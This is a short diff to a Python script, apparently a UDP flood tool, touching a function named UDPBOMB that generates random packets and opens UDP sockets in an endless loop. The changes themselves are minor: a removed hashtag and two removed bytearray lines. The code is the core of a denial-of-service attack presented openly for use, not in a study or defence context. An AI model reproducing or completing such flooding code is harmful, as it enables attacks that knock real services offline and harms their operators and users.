@@ -1,4 +1,4 @@
-#RymuxINV #DingDusTuls
+#RymuxINV
 import random
 import time
 import os
@@ -99,11 +99,9 @@ def UDP():
 def UDPBOMB():
  packet = random.randint(1024, 8192)
  byte_packet = random._urandom(packet)
-    
+   
  while True:
      try:
-         data = bytearray(56656)
-         data[0] = 0x1B
          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
          s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
